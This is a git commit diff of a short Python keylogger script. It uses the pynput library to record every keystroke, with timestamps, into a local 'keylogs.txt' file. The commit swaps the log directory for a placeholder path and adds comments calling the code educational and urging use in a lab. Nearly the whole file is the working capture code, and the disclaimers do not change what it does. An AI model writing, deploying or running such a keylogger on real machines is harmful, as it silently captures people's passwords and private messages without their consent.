f24214aeadd3a88f61dd48f6e47541e63fb0ecd4
Cameron Ash <94546554+HimmyAsh@users.noreply.github.com>
2023-12-26 12:24:55 -0600

    Fixed input, fixed the log directory

--- himmyash.py
+++ himmyash.py
@@ -1,3 +1,4 @@
+#This is for educational purposes only
 import os
 import pynput
 from pynput.keyboard import Key, Listener
@@ -5,15 +6,17 @@ import logging
 
 
 #Specifies the path for the directory
-path = './himmyash'
+path = './YourPath'
 
+#ensuring the path doesn't already exist
 try:
-    os.mkdir(path)
+    os.mkdir(path) 
 except FileExistsError:
     print("Folder %s already exists" % path)
 
-log_dir = r"./himmyash"
+log_dir = r"./YourPath"
 
+#Creating your file name, and logging keys in the created "keylogs.txt" file
 logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
         level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
@@ -22,3 +25,5 @@ def on_press(key):
 
 with Listener(on_press=on_press) as listener:
     listener.join()
+
+#Again this is for educational purposes only, try this in a secure lab environment if you please. This is one of many attack vectors malicious actors can use. Be safe
